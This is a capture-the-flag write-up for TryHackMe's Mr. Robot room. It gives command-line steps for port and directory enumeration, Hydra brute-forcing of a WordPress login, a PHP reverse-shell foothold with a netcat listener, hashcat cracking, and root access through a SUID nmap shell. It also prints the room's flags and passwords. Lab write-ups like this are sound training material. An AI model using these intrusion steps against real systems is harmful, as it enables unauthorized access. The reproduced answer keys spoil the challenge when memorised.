# 🐧 Mr. Robot CTF — TryHackMe Write‑Up

> _Based on the Mr. Robot TV show. Can you root the box?_  
> Room: **[Mr Robot CTF](https://tryhackme.com/room/mrrobot)**


<p align="center">
  <img src="https://i.imgur.com/mp5JwKO.png" />

  <a href="https://tryhackme.com/room/mrrobot"><img src="https://img.shields.io/badge/TryHackMe-Mr%20Robot-red?logo=tryhackme&logoColor=white" /> </a>
  <img src="https://img.shields.io/badge/Difficulty-Beginner%2FIntermediate-blue" />
  <img src="https://img.shields.io/badge/Focus-Web%20%7C%20PrivEsc%20%7C%20Bruteforce-success" />
  <img src="https://img.shields.io/badge/Platform-Linux-black?logo=linux" />
  
</p>

---

## 📚 Table of Contents
- [About](#-about)
- [Topics Covered](#-topics-covered)
- [Appendix Archive](#-appendix-archive)
- [Connect to the Network](#-connect-to-the-network)
- [Enumeration](#-enumeration)
- [Web & WordPress](#-web--wordpress)
- [Foothold](#-foothold)
- [Privilege Escalation](#-privilege-escalation)
- [Answers (Hidden)](#-answers-hidden)
- [Credits & Disclaimer](#-credits--disclaimer)

---

## 🔎 About
This is my clean, step-by-step write‑up for the **Mr. Robot** CTF on TryHackMe. It's structured to be **copy-paste friendly** and **spoiler-safe** — sensitive values like keys and credentials are **hidden by default** and can be revealed by clicking.

> **Note:** This repo is for **educational purposes** only. Use techniques responsibly and only on systems you own or have explicit permission to test.

---

## ✅ Topics Covered
- Network Enumeration
- Web Enumeration
- Brute Forcing (WordPress)
- Brute Forcing (Hash)
- Abusing SUID/SGID (nmap interactive shell)

---

## 🗄️ Appendix Archive
If you downloaded the appendix archive from the room, here’s the password (hidden to avoid spoilers):

<details>
  <summary><strong>Reveal Appendix Password</strong></summary>
  
  ```txt
  1 kn0w 1 5h0uldn'7!
  ```
</details>

---

## 🌐 Connect to the Network
To deploy the Mr. Robot VM, first connect to TryHackMe’s VPN.

1) **Download your OpenVPN config** from your Access page.  
   ![](https://i.gyazo.com/c86eba5538466dc1d948e09b6f14b53b.png)

2) **Connect using OpenVPN** (Linux example; change `yourconfig.ovpn`):
   ```bash
   sudo openvpn yourconfig.ovpn
   ```
   You’ll see `Initialization Sequence Completed` when connected.  
   ![](https://i.gyazo.com/42083cc1831acad79e5a6fa2b235792f.png)

3) **Verify connection** on the Access page — you should see a green tick and your internal IP.  
   ![](https://i.gyazo.com/fad648871fd0e51d1d5590d005329f1c.png)

4) **Deploy the room** and note your machine’s internal IP address.

> _No answers required for this section._

---

## 🧭 Enumeration

**Nmap**
```bash
sudo nmap -sS -sC -sV -A -Pn MACHINE_IP
```
Findings (trimmed):
- `22/tcp` — **closed** (SSH)
- `80/tcp` — **open** (Apache, HTTP)
- `443/tcp` — **open** (Apache, HTTPS; self‑signed cert)

**Nikto**
```bash
sudo nikto -host http://MACHINE_IP
```
Highlights:
- Missing security headers
- `X-Powered-By: PHP/5.5.29`

**Directory Bruteforce (Gobuster)**
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://MACHINE_IP -t 50
```
Interesting paths:
- `/blog`, `/wp-content`, `/wp-includes`, `/wp-login`
- `/readme`, `/robots`, `/license`, `/intro`

**Robots**
```
http://10.10.239.79/robots.txt
```
Also discovered **key-1** endpoint and dictionary file `fsocity.dic` (see Web/WordPress).

---

## 🕸️ Web & WordPress

**Login page**
```
http://MACHINE_IP/wp-login
```

**Hydra — enumerate valid user**
```bash
hydra -L fsocity.dic -p test MACHINE_IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"
```
Result:
- Valid user identified ➜ <details><summary><strong>Reveal Username</strong></summary>

  ```txt
  Elliot
  ```
  </details>

**Prepare clean wordlist (remove duplicates)**
```bash
sort fsocity.dic | uniq > fsocity_sorted.dic
```

**Hydra — password bruteforce for known user**
```bash
hydra -l Elliot -P fsocity_sorted.dic MACHINE_IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:S=302"
```
Result:
- Password found ➜ <details><summary><strong>Reveal Password</strong></summary>

  ```txt
  ER28-0652
  ```
  </details>

**Admin Panel**
```
http://1MACHINE_IP/wp-admin/
```

**Foothold via PHP Reverse Shell**
- Upload a PHP reverse shell (e.g., via Theme Editor or vulnerable upload).
- Configure your listener locally, then trigger the shell page.

Listener:
```bash
nc -nlvp 9001
```

Trigger the shell (example endpoint):
```
http://MACHINE_IP/pwned
```

Stabilize the shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 🧰 Foothold → User

Inspect `/home/robot`:
```bash
ls -la /home/robot
cat /home/robot/password.raw-md5
```
Hash format:
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Crack with hashcat (MD5):
```bash
hashcat -m 0 --force hash /usr/share/wordlists/rockyou.txt
```
Recovered password ➜ <details><summary><strong>Reveal robot password</strong></summary>

```txt
abcdefghijklmnopqrstuvwxyz
```
</details>

Switch user:
```bash
su robot
```

Grab **key-2** (hidden below in Answers).

---

## 🧨 Privilege Escalation (SUID/SGID)

Find SUID binaries:
```bash
find / -perm -u=s -type f 2>/dev/null
```

Notable finding:
```
/usr/local/bin/nmap
```

Old **nmap interactive mode** can spawn a shell:
```bash
nmap --interactive
nmap> !sh
# whoami
# cd /root && ls -l && cat key-3-of-3.txt
```

---

## 🧩 Answers (Hidden)

> Click to reveal each answer.

<details>
  <summary><strong>Key 1</strong> (click to reveal)</summary>

  ```txt
  073403c8a58a1f80d943455fb30724b9
  ```
</details>

<details>
  <summary><strong>Key 2</strong> (click to reveal)</summary>

  ```txt
  822c73956184f694993bede3eb39f959
  ```
</details>

<details>
  <summary><strong>Key 3</strong> (click to reveal)</summary>

  ```txt
  04787ddef27c3dee1ee161b21670b4e4
  ```
</details>

<details>
  <summary><strong>WordPress Username</strong> (click to reveal)</summary>

  ```txt
  Elliot
  ```
</details>

<details>
  <summary><strong>WordPress Password</strong> (click to reveal)</summary>

  ```txt
  ER28-0652
  ```
</details>

<details>
  <summary><strong>robot User Password</strong> (click to reveal)</summary>

  ```txt
  abcdefghijklmnopqrstuvwxyz
  ```
</details>

---

## 🙏 Disclaimer  
- **Write‑Up:** This repository is created for **learning and documentation** only. Do **not** use any technique against systems without **explicit authorization**.

---

### ⭐ If this helped you, consider leaving a star on the repo!
